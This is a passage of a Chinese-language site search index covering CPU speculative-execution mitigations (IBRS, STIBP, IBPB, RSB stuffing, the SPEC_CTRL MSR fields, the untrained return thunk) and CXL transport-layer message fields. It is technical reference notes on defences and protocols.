\u200b\u6bcf\u6b21\u200b\u4ece\u200b\u7528\u6237\u200b\u6001\u200b\u5207\u6362\u200b\u5230\u200b\u5185\u6838\u200b\u6001\u200b\u90fd\u200b\u8981\u200b\u5199\u5165\u200b\u4e00\u6b21\u200b <code>IA32_SPEC_CTRL.IBRS</code>\uff0c\u200b\u964d\u4f4e\u200b\u6027\u80fd\u200b</li> <li>AMD64 TECHNOLOGY INDIRECT BRANCH CONTROL EXTENSION</li> <li>Enhanced IBRS\uff1a\u200b\u6253\u5f00\u200b\u4e00\u6b21\u200b\u4ee5\u540e\u200b\uff0c\u200b\u603b\u662f\u200b\u542f\u7528\u200b IBRS</li> <li>\u200b\u4e0d\u518d\u200b\u9700\u8981\u200b\u6bcf\u6b21\u200b\u4ece\u200b\u7528\u6237\u200b\u6001\u200b\u5207\u6362\u200b\u5230\u200b\u5185\u6838\u200b\u6001\u53bb\u200b\u5199\u5165\u200b <code>IA32_SPEC_CTRL.IBRS</code></li> <li>\u200b\u4fee\u590d\u200b\u57fa\u4e8e\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u7684\u200b\u6f0f\u6d1e\u200b\uff1aSpectre Variant 2 Branch Target Injection</li> <li>Post-barrier Return Stack Buffer with eIBRS enabled (PBRSB-eIBRS)\uff1a\u200b\u5373\u4f7f\u200b\u6253\u5f00\u200b\u4e86\u200b eIBRS\uff0c\u200b\u7531\u4e8e\u200b IBRS \u200b\u4e3b\u8981\u200b\u9488\u5bf9\u200b\u7684\u200b\u662f\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\uff0c\u200b\u5bf9\u4e8e\u200b ret \u200b\u7684\u200b\u4fdd\u62a4\u200b\u662f\u200b\u4e0d\u8db3\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u7684\u200b\u9488\u5bf9\u200b Return Stack Buffer \u200b\u7684\u200b\u9632\u62a4\u200b</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#single-threaded-indirect-branch-predictors-stibp","title":"Single Threaded Indirect Branch Predictors (STIBP)","text":"<ul> <li>Single Thread Indirect Branch Predictors</li> <li>AMD64 TECHNOLOGY INDIRECT BRANCH CONTROL EXTENSION</li> <li>SMT \u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u200b\u540c\u4e00\u4e2a\u200b\u7269\u7406\u200b\u6838\u200b\u7684\u200b\u4e24\u4e2a\u200b\u903b\u8f91\u200b\u6838\u200b\u5171\u4eab\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u4e00\u4e2a\u200b\u903b\u8f91\u200b\u6838\u200b\u64cd\u63a7\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u903b\u8f91\u200b\u6838\u200b\u7684\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b</li> <li>STIBP \u200b\u8bbe\u7f6e\u200b\u542f\u7528\u200b\u540e\u200b\uff08<code>IA32_SPEC_CTRL.STIBP = 1</code>\uff09\uff0c\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u903b\u8f91\u200b\u6838\u200b\u4e4b\u95f4\u200b\u7684\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b\u9694\u79bb\u200b</li> <li>\u200b\u4fee\u590d\u200b\u57fa\u4e8e\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u7684\u200b\u6f0f\u6d1e\u200b\uff1aSpectre Variant 2 Branch Target Injection</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#indirect-branch-prediction-barrier-ibpb","title":"Indirect Branch Prediction Barrier (IBPB)","text":"<ul> <li>Indirect Branch Predictor Barrier</li> <li>AMD64 TECHNOLOGY INDIRECT BRANCH CONTROL EXTENSION</li> <li>IBPB \u200b\u662f\u200b\u4e00\u4e2a\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b Barrier\uff0c\u200b\u4fdd\u8bc1\u200b Barrier \u200b\u4e4b\u524d\u200b\u7684\u200b\u6307\u4ee4\u200b\u4e0d\u4f1a\u200b\u5f71\u54cd\u200b Barrier \u200b\u4e4b\u540e\u200b\u7684\u200b\u6307\u4ee4\u200b\u7684\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b</li> <li>\u200b\u8fd9\u4e2a\u200b Barrier \u200b\u901a\u8fc7\u200b\u5199\u5165\u200b MSR <code>IA32_PRED_CMD.IBPB = 0</code> \u200b\u5b9e\u73b0\u200b\uff0c\u200b\u6ca1\u6709\u200b\u5f15\u5165\u200b\u65b0\u200b\u7684\u200b\u6307\u4ee4\u200b</li> <li>\u200b\u524d\u9762\u200b\u63d0\u5230\u200b\uff0cIBRS \u200b\u53ea\u200b\u8003\u8651\u200b\u4e86\u200b\u7528\u6237\u200b\u6001\u5bf9\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u5f71\u54cd\u200b\uff0c\u200b\u6ca1\u6709\u200b\u8003\u8651\u200b\u7528\u6237\u200b\u6001\u200b\u4e4b\u95f4\u200b\u7684\u200b\u5f71\u54cd\u200b\uff0c\u200b\u8fd9\u200b\u53ef\u4ee5\u200b\u7531\u200b IBPB \u200b\u6765\u200b\u8865\u8db3\u200b</li> <li>\u200b\u4fee\u590d\u200b\u57fa\u4e8e\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u7684\u200b\u6f0f\u6d1e\u200b\uff1aSpectre Variant 2 Branch Target Injection</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#rsb-fillingstuffing","title":"RSB filling/stuffing","text":"<ul> <li>Retpoline</li> <li>\u200b\u7531\u4e8e\u200b Return Stack Buffer \u200b\u5728\u200b\u7a7a\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u4f7f\u7528\u200b\u88ab\u200b\u653b\u51fb\u8005\u200b\u63a7\u5236\u200b\u7684\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u6765\u200b\u9884\u6d4b\u200b\u76ee\u7684\u200b\u5730\u5740\u200b</li> <li>\u200b\u4e3a\u4e86\u200b\u7f13\u89e3\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u63d0\u524d\u200b\u5411\u200b Return Stack Buffer \u200b\u586b\u5145\u200b\u4e00\u4e9b\u200b\u5730\u5740\u200b\uff0c\u200b\u907f\u514d\u51fa\u73b0\u200b Underflow \u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u8fd9\u200b\u5c31\u200b\u53eb\u200b RSB filling/stuffing\uff1a     <pre><code>.rept 16\n    call 1f\n    pause\n    lfence\n\n    1:\n.endr\naddq $(8 * 16), %rsp\n</code></pre></li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#safe-ret","title":"Safe RET","text":"<ul> <li>Safe RET \u200b\u548c\u200b Retpoline \u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u8981\u200b\u5f3a\u8feb\u200b ret \u200b\u88ab\u200b\u9884\u6d4b\u200b\u5230\u200b\u6307\u5b9a\u200b\u7684\u200b\u9519\u8bef\u200b\u8def\u5f84\u200b\u4e0a\u200b\uff0c\u200b\u907f\u514d\u200b\u88ab\u200b\u653b\u51fb\u8005\u200b\u63a7\u5236\u200b\u9884\u6d4b\u200b\u7684\u200b\u5730\u5740\u200b</li> <li>\u200b\u4f46\u200b Safe RET \u200b\u8981\u200b\u89e3\u51b3\u200b\u7684\u200b\u662f\u200b Speculative Return Stack Overflow \u200b\u6f0f\u6d1e\u200b\u4e2d\u200b\uff0cBTB \u200b\u51fa\u73b0\u200b alias \u200b\u7684\u200b\u95ee\u9898\u200b</li> <li>\u200b\u56e0\u6b64\u200b Safe RET \u200b\u7684\u200b\u89e3\u51b3\u529e\u6cd5\u200b\u662f\u200b\uff0c\u200b\u4e3b\u52a8\u200b\u6784\u9020\u200b BTB alias\uff0c\u200b\u5148\u200b\u628a\u200b\u653b\u51fb\u8005\u200b\u4ece\u200b BTB \u200b\u4e2d\u200b\u5237\u6389\u200b\uff0c\u200b\u518d\u200b\u53bb\u200b\u8fdb\u884c\u200b\u5b9e\u9645\u200b\u7684\u200b ret</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#software-bhb-clearing","title":"Software BHB Clearing","text":"<ul> <li>Software BHB\uff08Branch History Buffer\uff09Clearing \u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\u9632\u6b62\u200b\u7528\u200b\u7528\u6237\u200b\u6001\u200b\u63a7\u5236\u200b\u7684\u200b BHB \u200b\u6765\u200b\u8fdb\u884c\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u7684\u200b\u9884\u6d4b\u200b</li> <li>\u200b\u56e0\u6b64\u200b\u5b9e\u73b0\u200b\u4e0a\u200b\u5c31\u662f\u200b\u5728\u200b\u7528\u6237\u200b\u6001\u200b\u5207\u6362\u200b\u5230\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9996\u5148\u200b\u8c03\u7528\u200b\u8db3\u591f\u200b\u6b21\u6570\u200b\u7684\u200b\u5206\u652f\u200b\uff0c\u200b\u4f7f\u5f97\u200b BHB \u200b\u4e2d\u200b\u7531\u200b\u7528\u6237\u200b\u6001\u200b\u8bbe\u7f6e\u200b\u7684\u200b\u90e8\u5206\u200b\u88ab\u200b\u5237\u6389\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u7528\u4e8e\u200b\u5185\u6838\u200b\u6001\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u7684\u200b BHB \u200b\u662f\u200b\u5b89\u5168\u200b\u7684\u200b</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#intel-msr","title":"Intel MSR","text":"<ul> <li>Intel \u200b\u5904\u7406\u5668\u200b\u4e0a\u200b\u5f88\u591a\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\u7684\u200b\u63a7\u5236\u200b\u90fd\u200b\u548c\u200b\u4e24\u4e2a\u200b MSR \u200b\u6709\u5173\u200b\uff1aIA32_SPEC_CTRL \u200b\u548c\u200b IA32_PRED_CMD\uff0c\u200b\u8fd9\u91cc\u200b\u603b\u7ed3\u200b\u4e00\u4e0b\u200b\u5b83\u4eec\u200b\u7684\u200b\u5404\u4e2a\u200b\u5b57\u200b\u6bb5\u200b\uff1a</li> <li>IA32_SPEC_CTRL:<ul> <li>[0]: IBRS, Indirect Branch Restricted Speculation\uff0c\u200b\u9694\u79bb\u200b\u7528\u6237\u200b\u6001\u200b\u548c\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b</li> <li>[1]: STIBP, Single Thread Indirect Branch Predictor\uff0c\u200b\u9694\u79bb\u200b\u540c\u4e00\u4e2a\u200b\u7269\u7406\u200b\u6838\u200b\u7684\u200b\u4e24\u4e2a\u200b\u903b\u8f91\u200b\u6838\u200b\u7684\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b</li> <li>[2]: SSBD\uff0cSpeculative Store Bypass Disable\uff0c\u200b\u7b49\u200b\u5148\u524d\u200b\u7684\u200b\u6240\u6709\u200b\u7684\u200b store \u200b\u5730\u5740\u200b\u5df2\u77e5\u200b\u540e\u200b\uff0c\u200b\u518d\u200b\u9884\u6d4b\u200b\u6267\u884c\u200b load</li> <li>[3]: IPRED_DIS_U\uff0cIndirect Predictor Disable User\uff0c\u200b\u7528\u6237\u200b\u6001\u4e0b\u200b\uff0c\u200b\u7b49\u5230\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u88ab\u200b\u5b9e\u9645\u200b\u8ba1\u7b97\u51fa\u6765\u200b\u540e\u200b\u624d\u200b\u8fdb\u884c\u200b\u540e\u7eed\u200b\u7684\u200b\u6267\u884c\u200b</li> <li>[4]: IPRED_DIS_S\uff0cIndirect Predictor Disable Supervisor\uff0c\u200b\u5185\u6838\u200b\u6001\u4e0b\u200b\uff0c\u200b\u7b49\u5230\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u88ab\u200b\u5b9e\u9645\u200b\u8ba1\u7b97\u51fa\u6765\u200b\u540e\u200b\u624d\u200b\u8fdb\u884c\u200b\u540e\u7eed\u200b\u7684\u200b\u6267\u884c\u200b</li> <li>[5]: RRSBA_DIS_U\uff0cRestricted Return Stack Buffer Alternate User\uff0c\u200b\u7528\u6237\u200b\u6001\u4e0b\u200b\uff0c\u200b\u5f53\u200b Return Stack Buffer \u200b\u4e3a\u7a7a\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7981\u6b62\u200b\u9884\u6d4b\u200b</li> <li>[6]: RRSBA_DIS_S\uff0cRestricted Return Stack Buffer Alternate Supervisor\uff0c\u200b\u5185\u6838\u200b\u6001\u4e0b\u200b\uff0c\u200b\u5f53\u200b Return Stack Buffer \u200b\u4e3a\u7a7a\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7981\u6b62\u200b\u9884\u6d4b\u200b</li> <li>[7]: PSFD\uff0c\u200b\u7981\u6b62\u200b Fast Store Forwarding Predictor</li> <li>[8]: DDPD_U\uff0c\u200b\u7528\u6237\u200b\u6001\u4e0b\u200b\u7981\u6b62\u200b Data Dependent Prefetcher</li> <li>[10]: BHI_DIS_S\uff0cBranch History Injection Disable Supervisor\uff0c\u200b\u9694\u79bb\u200b\u7528\u6237\u200b\u6001\u200b\u548c\u200b\u5185\u6838\u200b\u6001\u200b\u7528\u4e8e\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u7684\u200b\u5206\u652f\u200b\u5386\u53f2\u200b</li> </ul> </li> <li>IA32_PRED_CMD:<ul> <li>[0]: IPBP\uff0cIndirect Branch Prediction Barrier\uff0c\u200b\u963b\u6b62\u200b Barrier \u200b\u524d\u9762\u200b\u7684\u200b\u6307\u4ee4\u200b\u5f71\u54cd\u200b Barrier \u200b\u540e\u9762\u200b\u7684\u200b\u6307\u4ee4\u200b\u7684\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#__user-pointer-sanitization","title":"__user pointer sanitization","text":"<ul> <li>[PATCH v6 13/13] x86/spectre: report get_user mitigation for spectre_v1</li> <li>\u200b\u5185\u6838\u200b\u5728\u200b\u8bbf\u95ee\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\u5730\u5740\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6dfb\u52a0\u200b barrier \u200b\u4ee5\u200b\u907f\u514d\u200b\u63a8\u6d4b\u200b\u6267\u884c\u200b</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#untrained-return-thunk","title":"untrained return thunk","text":"<ul> <li> <p>\u200b\u4e3a\u4e86\u200b\u907f\u514d\u200b ret \u200b\u88ab\u200b\u9884\u6d4b\u200b\uff0c\u200b\u5229\u7528\u200b x86 \u200b\u6307\u4ee4\u96c6\u200b\u7f16\u7801\u200b\u7684\u200b\u7279\u6027\u200b\uff0c\u200b\u4f7f\u5f97\u200b ret \u200b\u6307\u4ee4\u200b\u88ab\u200b\u89e3\u91ca\u200b\u4e3a\u200b\u975e\u200b ret \u200b\u6307\u4ee4\u200b\u7684\u200b\u4e00\u90e8\u5206\u200b\uff0c\u200b\u518d\u200b\u53bb\u200b\u6267\u884c\u200b\u8fd9\u200b\u6761\u200b ret \u200b\u6307\u4ee4\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5b83\u200b\u5c31\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u9884\u6d4b\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u7279\u522b\u200b\u7684\u200b\u6307\u4ee4\u200b\u5e8f\u5217\u200b\u5982\u4e0b\u200b\uff08\u200b\u5bf9\u5e94\u200b Linux \u200b\u7684\u200b <code>retbleed_untrain_ret</code> \u200b\u51fd\u6570\u200b\uff09\uff1a</p> <pre><code>1:\n.byte 0xf6\n2:\nret\nint 3\nlfence\njmp 2b\nint 3\n</code></pre> </li> <li> <p>\u200b\u8fd9\u200b\u6bb5\u200b\u4ee3\u7801\u200b\u4ece\u200b <code>1:</code> \u200b\u5904\u200b\u5f00\u59cb\u200b\u6267\u884c\u200b\uff0c\u200b\u7531\u4e8e\u200b <code>test $0xcc, %bl</code> \u200b\u7684\u200b\u7f16\u7801\u200b\u548c\u200b <code>.byte 0xf6; ret; int3</code> \u200b\u6307\u4ee4\u200b\u76f8\u540c\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5b83\u200b\u7684\u200b\u8bed\u4e49\u200b\u76f8\u5f53\u4e8e\u200b\u662f\u200b <code>test $0xcc, %bl; lfence; jmp 2b</code>\uff1b\u200b\u7136\u540e\u200b\u8df3\u8f6c\u200b\u5230\u200b <code>2:</code> \u200b\u5904\u200b\u7684\u200b ret \u200b\u6307\u4ee4\u200b</p> </li> <li>\u200b\u5728\u200b\u6267\u884c\u200b <code>test $0xcc, %bl</code> \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u628a\u200b <code>ret</code> \u200b\u6307\u4ee4\u200b\u6807\u8bb0\u200b\u4e3a\u200b\u975e\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4e4b\u540e\u200b\u518d\u200b\u53bb\u200b\u6267\u884c\u200b\u5b83\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9884\u6d4b\u5668\u200b\u5c31\u200b\u4e0d\u4f1a\u200b\u5de5\u4f5c\u200b\uff0c\u200b\u4ece\u800c\u200b\u907f\u514d\u200b\u4e86\u200b\u6f0f\u6d1e\u200b\u7684\u200b\u5229\u7528\u200b</li> </ul>"},{"location":"hardware/cxl.html","title":"CXL (Compute Express Link)","text":"<p>CXL \u200b\u7684\u200b\u6807\u51c6\u200b\u662f\u200b\u516c\u5f00\u200b\u4e0b\u8f7d\u200b\u7684\u200b\uff1ahttps://www.computeexpresslink.org/download-the-specification\uff0c\u200b\u4e0b\u6587\u200b\u53c2\u8003\u200b\u7684\u200b\u662f\u200b 2022 \u200b\u5e74\u200b 8 \u200b\u6708\u200b 1 \u200b\u65e5\u200b\u7684\u200b CXL 3.0 \u200b\u7248\u672c\u200b\u3002</p>"},{"location":"hardware/cxl.html#cxl","title":"CXL \u200b\u8bbe\u5907\u200b\u7c7b\u578b","text":"<p>CXL \u200b\u5bf9\u200b PCIe \u200b\u7684\u200b\u91cd\u8981\u200b\u7684\u200b\u6269\u5c55\u200b\uff0c\u200b\u4e00\u662f\u200b\u5728\u4e8e\u200b\u8ba9\u200b\u8bbe\u5907\u200b\u53ef\u4ee5\u200b\u548c\u200b CPU \u200b\u5b9e\u73b0\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\uff08CXL.cache\uff09\uff0c\u200b\u4e8c\u662f\u200b\u53ef\u4ee5\u200b\u505a\u200b\u8fdc\u7a0b\u200b\u7684\u200b\u5185\u5b58\u200b\uff08CXL.mem\uff09\u3002</p> <p>\u200b\u5177\u4f53\u200b\u4e0b\u6765\u200b\uff0cCXL \u200b\u6807\u51c6\u200b\u4e3b\u8981\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e09\u7c7b\u200b\u8bbe\u5907\u200b\uff1a</p> <ul> <li>CXL Type 1: \u200b\u8bbe\u5907\u200b\u5e26\u6709\u200b\u4e0e\u200b CPU \u200b\u4e00\u81f4\u200b\u7684\u200b\u7f13\u5b58\u200b\uff0c\u200b\u5b9e\u73b0\u200b CXL.io \u200b\u548c\u200b CXL.cache</li> <li>CXL Type 2: \u200b\u8bbe\u5907\u200b\u5e26\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b\u5185\u5b58\u200b\u548c\u200b\u4e0e\u200b CPU \u200b\u4e00\u81f4\u200b\u7684\u200b\u7f13\u5b58\u200b\uff0c\u200b\u5b9e\u73b0\u200b CXL.io\uff0cCXL.cache \u200b\u548c\u200b CXL.mem</li> <li>CXL Type 3: \u200b\u8bbe\u5907\u200b\u5e26\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b\u5185\u5b58\u200b\uff0c\u200b\u5b9e\u73b0\u200b CXL.io \u200b\u548c\u200b CXL.mem</li> </ul>"},{"location":"hardware/cxl.html#cxl_1","title":"CXL \u200b\u4f20\u8f93\u5c42","text":""},{"location":"hardware/cxl.html#cxlio","title":"CXL.io","text":"<p>CXL.io \u200b\u57fa\u672c\u4e0a\u200b\u5c31\u662f\u200b PCIe \u200b\u534f\u8bae\u200b\uff1a</p> <pre><code>CXL.io provides a non-coherent load/store interface for I/O devices. Figure\n3-1 shows where the CXL.io transaction layer exists in the Flex Bus layered\nhierarchy. Transaction types, transaction packet formatting, credit-based\nflow control, virtual channel management, and transaction ordering rules\nfollow the PCIe* definition; please refer to the \u201cTransaction Layer\nSpecification\u201d chapter of PCIe Base Specification for details. This chapter\nhighlights notable PCIe operational modes or features that are used for\nCXL.io.\n</code></pre> <p>CXL 3.0 \u200b\u901f\u5ea6\u200b\u662f\u200b 64.0 GT/s\uff0c\u200b\u4f7f\u7528\u200b PAM4 \u200b\u7f16\u7801\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u7684\u200b\u662f\u200b PCIe 6.0\u3002</p>"},{"location":"hardware/cxl.html#cxlcache","title":"CXL.cache","text":"<p>CXL.cache \u200b\u6bcf\u4e2a\u200b\u65b9\u5411\u200b\u4e0a\u200b\u6709\u200b\u4e09\u4e2a\u200b channel\uff1a\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u54cd\u5e94\u200b\u548c\u200b\u6570\u636e\u200b\u3002\u200b\u8003\u8651\u200b\u5230\u200b Host \u200b\u548c\u200b Device \u200b\u7684\u200b\u4f20\u8f93\u200b\u65b9\u5411\u200b\uff0c\u200b\u5c31\u662f\u200b\u516d\u4e2a\u200b channel\uff1aD2H Req\uff0cD2H Resp\uff0cD2H Data\uff0cH2D Req\uff0cH2D Resp\uff0cH2D Data\u3002\u200b\u5728\u200b Data channel \u200b\u4e0a\u200b\u4f20\u8f93\u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u5927\u5c0f\u200b\u662f\u200b 64 \u200b\u5b57\u8282\u200b\u3002</p> <p>CXL.cache \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u72b6\u6001\u200b\u91c7\u7528\u200b\u7684\u200b\u662f\u200b MESI\u3002</p> <p>CXL.cache \u200b\u4f20\u8f93\u200b\u6709\u200b\u4e09\u79cd\u200b\u6a21\u5f0f\u200b\uff1a68B Flit\uff0c256B Flit \u200b\u548c\u200b PBR Flit\u3002</p> <p>H2D Request \u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\uff1a</p> <ul> <li>Valid</li> <li>Opcode</li> <li><code>Address[51:6]</code>: \u200b\u7269\u7406\u5730\u5740\u200b</li> <li>UQID: Unique Queue ID</li> <li>CacheID: Only in 256B Flit</li> <li>SPID/DPID: Only in PBR Flit</li> </ul> <p>D2H Response \u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\uff1a</p> <ul> <li>Valid</li> <li>Opcode</li> <li>UQID: Unique Queue ID</li> <li>DPID: Only in PBR Flit</li> </ul> <p>D2H Data \u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\uff1a</p> <ul> <li>Valid</li> <li>UQID: Unique Queue ID</li> <li>ChunkValid: Only in 68B Flit</li> <li>Bogus</li> <li>Poison: data is corrupted</li> <li>BEP: Only in 256B Flit &amp; PBR Flit</li> <li>DPID: Only in PBR Flit</li> </ul> <p>D2H Request \u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\uff1a</p> <ul> <li>Valid</li> <li>Opcode</li> <li>CQID: Command Queue ID</li> <li>NT: Non Temporal</li> <li>CacheID: Only in 256B Flit</li> <li>Address: 46 \u200b\u4f4d\u200b\u7269\u7406\u5730\u5740\u200b</li> <li>SPID/DPID: Only in PBR Flit</li> </ul> <p>H2D Response \u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\uff1a</p> <ul> <li>Valid</li> <li>Opcode</li> <li>RspData</li> <li>RSP_PRE</li> <li>CQID: Command Queue ID</li> <li>CacheID: Only in 256B Flit</li> <li>DPID: Only in PBR Flit</li> </ul> <p>H2D Data \u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\uff1a</p> <ul> <li>Valid</li> <li>CQID: Command Queue ID</li> <li>ChunkValid: Only in 68B Flit</li> <li>Bogus</li> <li>GO-Err</li> <li>CacheID: Only in 256B Flit</li> <li>DPID: Only in PBR Flit</li> </ul>"},{"location":"hardware/cxl.html#_1","title":"\u8bf7\u6c42\u200b\u7c7b\u578b","text":"<p>\u200b\u9996\u5148\u200b\u8003\u8651\u200b Host \u200b\u4f1a\u200b\u53d1\u9001\u200b\u7684\u200b\u8bf7\u6c42\u200b\u3002</p> <p>\u200b\u7b2c\u4e00\u79cd\u200b\u662f\u200b SnpData\uff0c\u200b\u4f8b\u5982\u200b\u5728\u200b Host \u200b\u5728\u200b\u8bfb\u53d6\u200b\u7684\u200b\u65f6\u5019\u200b\u51fa\u73b0\u200b\u7f3a\u5931\u200b\uff0c\u200b\u6b64\u65f6\u200b\u9700\u8981\u200b\u5411\u200b Device \u200b\u53d1\u9001\u200b Snoop\uff0c\u200b\u83b7\u53d6\u200b\u6700\u65b0\u200b\u7684\u200b Dirty \u200b\u7684\u200b Data\uff0c\u200b\u6216\u8005\u200b\u8ba9\u200b Device \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u964d\u7ea7\u200b\u4e3a\u200b Shared \u200b\u72b6\u6001\u200b\u3002</p> <p>Device \u200b\u6536\u5230\u200b SnpData \u200b\u540e\u200b\uff0c\u200b\u5982\u679c\u200b\u53d1\u73b0\u200b\u7f13\u5b58\u200b\u884c\u4e0d\u5728\u200b\u7f13\u5b58\u200b\u4e2d\u200b\uff08\u200b\u72b6\u6001\u200b\u662f\u200b I\uff09\uff0c\u200b\u4f1a\u200b\u56de\u590d\u200b\u4e00\u4e2a\u200b RspIHitI\uff1b\u200b\u5982\u679c\u200b\u7f13\u5b58\u200b\u884c\u5728\u200b\u7f13\u5b58\u200b\u4e2d\u4e14\u200b\u6570\u636e\u200b\u6ca1\u6709\u200b\u4fee\u6539\u200b\uff08\u200b\u72b6\u6001\u200b\u662f\u200b S \u200b\u6216\u8005\u200b E\uff09\uff0c\u200b\u964d\u7ea7\u200b\u5230\u200b S\uff0c\u200b\u4f1a\u200b\u56de\u590d\u200b\u4e00\u4e2a\u200b RspSHitSE\uff1b\u200b\u5982\u679c\u200b\u7f13\u5b58\u200b\u884c\u662f\u200b dirty\uff08\u200b\u72b6\u6001\u200b\u662f\u200b M\uff09\uff0c\u200b\u53ef\u4ee5\u200b\u9009\u62e9\u200b\u964d\u7ea7\u200b\u5230\u200b S\uff0c\u200b\u7136\u540e\u200b\u56de\u590d\u200b RspSFwdM \u200b\u4ee5\u53ca\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u9009\u62e9\u200b\u53d8\u6210\u200b Invalid\uff0c\u200b\u56de\u590d\u200b RspIFwdM \u200b\u4ee5\u53ca\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u8fd9\u4e9b\u200b D2H Response \u200b\u7684\u200b Opcode \u200b\u7684\u200b\u540d\u5b57\u200b\u683c\u5f0f\u200b\u5f88\u200b\u6709\u200b\u89c4\u5f8b\u200b\uff0c<code>Rsp+A+Hit/Fwd+B</code>\uff0cA \u200b\u8868\u793a\u200b\u65b0\u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u72b6\u6001\u200b\uff0cB \u200b\u662f\u200b\u539f\u6765\u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u72b6\u6001\u200b\uff0cHit \u200b\u4e0d\u200b\u9644\u5e26\u200b\u6570\u636e\u200b\uff0cFwd \u200b\u9644\u5e26\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u7b2c\u4e8c\u79cd\u200b\u662f\u200b SnpInv\uff0c\u200b\u4f8b\u5982\u200b Host \u200b\u8981\u200b\u5199\u5165\u200b\u7f13\u5b58\u200b\uff0c\u200b\u5c31\u8981\u200b invalidate \u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u3002Device \u200b\u6536\u5230\u200b\u4ee5\u540e\u200b\uff0c\u200b\u53ef\u80fd\u200b\u8fd4\u56de\u200b RspIHitI\u3001RspIHitSE \u200b\u548c\u200b RspIFwdM\uff0c\u200b\u5206\u522b\u200b\u5bf9\u5e94\u200b\u4e0d\u540c\u200b\u7684\u200b\u521d\u59cb\u72b6\u6001\u200b\uff0c\u200b\u6700\u7ec8\u200b\u90fd\u200b\u662f\u200b Invalid \u200b\u6001\u200b\u3002</p> <p>\u200b\u7b2c\u4e09\u79cd\u200b\u662f\u200b 